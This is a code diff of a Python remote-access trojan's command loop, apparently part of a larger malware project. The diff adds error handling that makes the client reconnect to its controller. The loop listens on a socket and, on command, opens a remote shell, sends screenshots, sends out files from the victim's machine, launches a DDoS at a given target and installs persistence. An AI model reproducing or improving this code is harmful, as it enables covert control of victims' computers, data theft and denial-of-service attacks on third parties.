@@ -25,37 +25,48 @@ def central():
 	global host
 	global port
 	global s
+	cont = 0
 	while True:
-		data = s.recv(1024)
-		if data.decode("utf-8") == 'shell':
-			cmd.shell(s,host,port) 
-		if data.decode("utf-8") == 'print':
-			screenshot.printscr(s,host,port) 
-			s.send(str.encode("Image send!"))
-		if data.decode("utf-8") == 'download':
-			filename = s.recv(1024)
-			if os.path.isfile(filename):
-				download.down(filename,s,host,port)
+		try:
+			
+			data = s.recv(1024)
+			if data.decode("utf-8") == 'shell':
+				cmd.shell(s,host,port) 
+			if data.decode("utf-8") == 'print':
+				screenshot.printscr(s,host,port) 
+				s.send(str.encode("Image send!"))
+			if data.decode("utf-8") == 'download':
+				filename = s.recv(1024)
+				if os.path.isfile(filename):
+					download.down(filename,s,host,port)
+				else:
+					s.send(str.encode("No such file"))
+			if data[:4].decode("utf-8") == 'ddos':
+				target = s.recv(1024).decode("utf-8")  
+				port = "  "
+				port += s.recv(1024).decode("utf-8")
+				ddos.begin(target,port)		
+			if data.decode("utf-8") == 'persistence':
+				persistence.main(host,s,port)
+			if data.decode("utf-8") == 'quit':
+				s.close()
+				main()
+			if data.decode("utf-8") == 'close':
+				cont += 1
+				s.send(str.encode('Desligando...'))
+				time.sleep(0.3)
+				s.send(str.encode('Desligado!'))
+				s.close()
+				sys.exit()
 			else:
-				s.send(str.encode("No such file"))
-		if data[:4].decode("utf-8") == 'ddos':
-			target = s.recv(1024).decode("utf-8")  
-			port = "  "
-			port += s.recv(1024).decode("utf-8")
-			ddos.begin(target,port)		
-		if data.decode("utf-8") == 'persistence':
-			persistence.main(host,s,port)
-		if data.decode("utf-8") == 'quit':
-			s.close()
-			main()
-		if data.decode("utf-8") == 'close':
-			s.send(str.encode('Desligando...'))
-			time.sleep(0.3)
-			s.send(str.encode('Desligado!'))
-			s.close()
-			sys.exit()
-		else:
-			s.send(str.encode("Nothing here...")) 
+				s.send(str.encode("Nothing here...")) 
+		except:
+			if cont == 1:
+				s.close()
+				sys.exit()
+			else:
+				s.close()
+				main()
 
 def main():
 	socket_create()
